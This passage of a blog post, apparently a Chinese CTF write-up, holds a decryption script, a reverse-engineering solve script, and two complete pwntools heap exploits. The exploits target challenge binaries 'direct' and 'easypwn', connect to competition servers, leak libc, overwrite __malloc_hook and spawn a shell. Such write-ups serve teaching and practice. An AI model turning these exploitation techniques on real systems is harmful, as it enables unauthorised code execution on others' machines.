+ <span class="number">2</span>].strip(<span class="string">b&quot;\\r\\n&quot;</span>)))[<span class="number">0</span>]</span><br><span class="line">        data = get_bytes(readlines[index + <span class="number">3</span>].strip(<span class="string">b&quot;\\r\\n&quot;</span>))</span><br><span class="line">        pcount = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, get_bytes(readlines[index + <span class="number">4</span>].strip(<span class="string">b&quot;\\r\\n&quot;</span>)))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(btime, boffset, pcount)</span></span><br><span class="line"></span><br><span class="line">        de_data = decrypt(btime, boffset, data, pcount)</span><br><span class="line"></span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        rf.writelines(de_data + <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line">    rf.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    total_decrypt()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="侧防"><a href="#侧防" class="headerlink" title="侧防"></a>侧防</h3><p>对<code>12f0</code>函数中进行的操作逆向，该操作首先是依次与给定数组进行异或<code>+&#39;A&#39;</code>，然后四位一组进行右移一位。</p><p>出来的<code>flag</code>少了后面两位猜测为 <code>score&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ans = &quot;4F4243684E76495C65775554647C784C78796974435A466D497D57664E44714C49276123981629594390000&quot;</span></span><br><span class="line">ans1 = <span class="string">&quot;4F4243684E76495C65775554647C784C&quot;</span></span><br><span class="line">ans2 = <span class="string">&quot;78796974435A466D497D57664E44714C&quot;</span></span><br><span class="line">ans3 = <span class="string">&quot;4462655E57505C4F&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = []</span><br><span class="line">flag2 = []</span><br><span class="line">flag3 = []</span><br><span class="line"></span><br><span class="line">byt = [<span class="number">0x51</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x67</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line">str_len = <span class="built_in">len</span>(ans1) + <span class="built_in">len</span>(ans2) + <span class="built_in">len</span>(ans3)</span><br><span class="line"><span class="built_in">print</span>(str_len)</span><br><span class="line">i = <span class="built_in">len</span>(ans1)</span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    flag1.append(<span class="built_in">int</span>(ans1[i - <span class="number">2</span>:i], <span class="number">16</span>))</span><br><span class="line">    i -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">i = <span class="built_in">len</span>(ans2)</span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    flag1.append(<span class="built_in">int</span>(ans2[i - <span class="number">2</span>:i], <span class="number">16</span>))</span><br><span class="line">    i -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">i = <span class="built_in">len</span>(ans3)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    flag1.append(<span class="built_in">int</span>(ans3[i - <span class="number">2</span>:i], <span class="number">16</span>))</span><br><span class="line">    i -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag1&quot;</span>, flag1)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">int</span>(str_len / <span class="number">2</span>):</span><br><span class="line">    tmp_flag = flag1[i:i + <span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(tmp_flag)</span><br><span class="line">    <span class="keyword">for</span> index, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(tmp_flag):</span><br><span class="line">        flag2.append(tmp_flag[(index + <span class="number">1</span>) % <span class="number">4</span>])</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag2&quot;</span>, flag2)</span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag2):</span><br><span class="line">    flag3.append((i - <span class="number">0x41</span>) ^ byt[index % <span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag 3&quot;</span>, flag3)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>)</span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag3:</span><br><span class="line">    l += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        exit()</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h3><p><code>edit</code>函数中<code>offset</code>为有符号的<code>int</code>类型，输入负值，导致可以任意的地址后向写</p><p>不存在输出函数和<code>puts,printf</code>。没办法修改<code>stdout</code>泄露<code>libc</code>地址，这是注意到在<code>output_dir</code>中存在输出，也就是调用<code>readdir</code>函数，输出了返回指针<code>+0x13</code>指向的位置。</p><p>从<code>sysdeps/posix/readdir.c</code>中找到了该函数的源码，并且在调试中发现<code>opendir</code>会申请一块<code>0x8040</code>大小的堆块存储<code>DIR</code>结构体，而<code>readdir</code>就是根据该结构体中的数据进行操作的，会从<code>fd</code>指向的文件中读取max大小的字节，存储到<code>DIR+0x30</code>的位置。注意到返回的指针的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dirp-&gt;offset &gt;= dirp-&gt;size)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//读取数据</span></span><br><span class="line">  dirp-&gt;size = (<span class="type">size_t</span>) bytes;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Reset the offset into the buffer.  */</span></span><br><span class="line">  dirp-&gt;offset = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     dp = (DIRENT_TYPE *) &amp;dirp-&gt;data[dirp-&gt;offset];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果将<code>offset</code>的大小改写为小于<code>size</code>，此时<code>offset</code>就不会清零，也就是会返回指定位置的内存指针。即如果控制了<code>offset,size</code>就可以得到想要的高地址处的指针。</p><p>而<code>opendir</code>只有在调用的时候才会申请内存，那么在函数调用之后再次申请一块<code>chunk</code>，对该<code>chunk</code>进行<code>edit</code>，后向任意写，就可以改写<code>DIR</code>结构体中的数据，控制<code>readdir</code>返回的内存指针，泄露<code>libc</code>地址。</p><p>得到<code>libc</code>地址之后，之后利用后向任意写改写<code>fastbin</code>的<code>fd</code>指针，覆写<code>malloc_hook</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./direct&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x555555554F4E&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.214.3&#x27;</span>, <span class="number">1912</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, offset, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Offset: &quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_dir</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put_dir</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;tcache has filled&quot;</span>)</span><br><span class="line"></span><br><span class="line">dirp_address = <span class="number">0x6020E8</span></span><br><span class="line">dir_chunk_size = <span class="number">0x8040</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x68</span>)</span><br><span class="line">open_dir()</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">offset = dir_chunk_size - <span class="number">0x40</span> + <span class="number">0x10</span> - <span class="number">0x13</span> + <span class="number">0x8</span></span><br><span class="line">payload = p64(<span class="number">3</span>) + p64(<span class="number">0x8000</span>) + p64(offset + <span class="number">0x10</span>)  + p64(offset)</span><br><span class="line">edit(<span class="number">9</span>, -(dir_chunk_size + <span class="number">0xe0</span>), <span class="number">0x60</span>, payload)</span><br><span class="line">put_dir()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Filename: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">96</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, -(<span class="number">0x70</span>), <span class="number">0x40</span>, p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x10</span>, p64(libc.address + one_gadget))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x68</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h3><p><code>off-by-null</code>漏洞，覆盖下一个堆块的大小的第一字节为<code>\\x00</code>，从而造成堆重叠，覆盖<code>unsorted bin</code>的<code>bk</code>指针，利用<code>unsorted bin attack</code> 覆写<code>global_max_fast</code>，使得所有的堆块分配到<code>fastbin</code>中，在利用<code>fastbin attack</code>覆写<code>stdout</code>泄露<code>libc</code>地址，覆写<code>malloc_hook getshell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;easypwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x555555554F97&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = process([file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x555555554F97&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;)</span></span><br><span class="line">    one_gadget = <span class="number">0xf0364</span></span><br><span class="line">    <span class="comment"># global_max_fast = b&quot;\\x38\\x78&quot;</span></span><br><span class="line">    <span class="comment"># stderr_157 = b&quot;\\xdd\\x15&quot;</span></span><br><span class="line">    global_max_fast = <span class="string">b&quot;\\xe8\\x77&quot;</span></span><br><span class="line">    <span class="comment"># global_max_fast = b&quot;\\x78\\x38&quot;</span></span><br><span class="line">    stderr_157 = <span class="string">b&quot;\\xdd\\x65&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;39.101.184.181&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-easypwn.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xf1207</span></span><br><span class="line">    global_max_fast = <span class="string">b&quot;\\xe8\\x77&quot;</span></span><br><span class="line">    <span class="comment"># global_max_fast = b&quot;\\x78\\x38&quot;</span></span><br><span class="line">    stderr_157 = <span class="string">b&quot;\\xdd\\x65&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:\\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:\\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:\\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:\\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:\\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    add(<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x138</span>)</span><br><span class="line">    add(<span class="number">0x168</span>)</span><br><span class="line">    edit(<span class="number">1</span>, cyclic(<span class="number">0xf0</span>) +p64(<span class="number">0x100</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, cyclic(<span class="number">0x28</span>))</span><br><span class="line">    add(<span class="number">0x18</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 4</span></span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">    edit(<span class="number">5</span>, cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + cyclic(<span class="number">0x18</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, cyclic(<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0</span>) + global_max_fast + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;global max fast has changed&quot;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">3</span>, stderr_157 + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">    edit(<span class="number">4</span>, cyclic(<span class="number">0x18</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&quot;\\x50\\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">6</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">0x6</span> + p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&quot;\\x00\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.recv(<span class="number">0x40</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) + <span class="number">0x20</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            add(<span class="number">0x28</span>)</span><br><span class="line">            add(<span class="number">0x138</span>)</span><br><span class="line">            add(<span class="number">0x168</span>)</span><br><span class="line">            edit(<span class="number">1</span>, cyclic(<span class="number">0xf0</span>) +p64(<span class="number">0x100</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">            delete(<span class="number">1</span>)</span><br><span class="line">            edit(<span class="number">0</span>, cyclic(<span class="number">0x28</span>))</span><br><span class="line">            add(<span class="number">0x18</span>) <span class="comment"># 1</span></span><br><span class="line">            add(<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">            delete(<span class="number">1</span>)</span><br><span class="line">            delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            add(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">            add(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">            add(<span class="number">0x68</span>) <span class="comment"># 4</span></span><br><span class="line">            add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">            edit(<span class="number">5</span>, cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + cyclic(<span class="number">0x18</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">            edit(<span class="number">2</span>, cyclic(<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">            delete(<span class="number">1</span>)</span><br><span class="line">            edit(<span class="number">4</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0</span>) + global_max_fast + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">            add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">            log.success(<span class="string">&quot;global max fast has changed&quot;</span>)</span><br><span class="line">            delete(<span class="number">2</span>)</span><br><span class="line">            delete(<span class="number">1</span>)</span><br><span class="line">            edit(<span class="number">3</span>, stderr_157 + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">            edit(<span class="number">4</span>, cyclic(<span class="number">0x18</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&quot;\\x50\\n&quot;</span>)</span><br><span class="line">            add(<span class="number">0x68</span>)</span><br><span class="line">            add(<span class="number">0x68</span>)</span><br><span class="line">            add(<span class="number">0x68</span>)</span><br><span class="line">            